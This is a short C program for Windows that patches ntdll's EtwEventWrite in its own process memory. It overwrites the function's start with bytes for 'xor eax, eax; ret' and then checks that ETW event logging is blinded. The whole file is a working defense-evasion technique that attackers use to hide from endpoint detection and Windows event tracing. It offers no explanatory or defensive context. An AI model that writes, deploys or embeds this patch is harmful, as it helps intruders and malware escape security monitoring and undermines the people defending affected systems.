#include <windows.h>
#include <evntprov.h>
#include <stdio.h>

typedef ULONG (WINAPI* fnEtwEventWrite)(
    REGHANDLE              RegHandle,
    EVENT_DESCRIPTOR const *EventDescriptor,
    ULONG                  UserDataCount,
    EVENT_DATA_DESCRIPTOR  *UserData
);

BOOL CheckETW(fnEtwEventWrite pFn) {
    ULONG status = pFn(0, NULL, 0, NULL);
    printf("[+] EtwEventWrite returned: 0x%08lX\n", status);
    if (status == 0) {
        printf("[+] ETW is BLIND - events are silently dropped\n");
        return TRUE;
    }
    printf("[-] ETW is still active\n");
    return FALSE;
}

VOID PrintBytes(PVOID pAddress, SIZE_T size) {
    BYTE* pBytes = (BYTE*)pAddress;
    for (SIZE_T i = 0; i < size; i++) {
        printf("%02X ", pBytes[i]);
    }
    printf("\n");
}

int main()
{
    printf("[+] EtwEventWrite Is going to be patched \n");

    DWORD dwOldProtection = 0x00;
    PVOID pEtwEventWrite = NULL;
    BYTE pShellcode[3] = {
        0x33, 0xC0,  // xor eax, eax
        0xC3        // ret
    };
    
    pEtwEventWrite = GetProcAddress(GetModuleHandleA("ntdll"), "EtwEventWrite");
    if (!pEtwEventWrite)
    {
        printf("[!] GetProcAddress failed with error %lu \n", GetLastError());
        return FALSE;
    }

    
    printf("Before Patching..\n");
    
    PrintBytes(pEtwEventWrite, 6);
    
    getchar();
    
    if (!VirtualProtect(pEtwEventWrite, sizeof(pShellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection))
    {
        printf("[!] VirtualProtect [1] failed with error %lu \n", GetLastError());
        return FALSE;
    }

    memcpy(pEtwEventWrite, pShellcode, sizeof(pShellcode));

    if (!VirtualProtect(pEtwEventWrite, sizeof(pShellcode), dwOldProtection, &dwOldProtection))
    {
        printf("[!] VirtualProtect [2] failed with error %lu \n", GetLastError());
        return FALSE;
    }

    printf("After Patching..\n");
    PrintBytes(pEtwEventWrite, 6);

    CheckETW((fnEtwEventWrite)pEtwEventWrite);

    // getchar();

    return TRUE;
}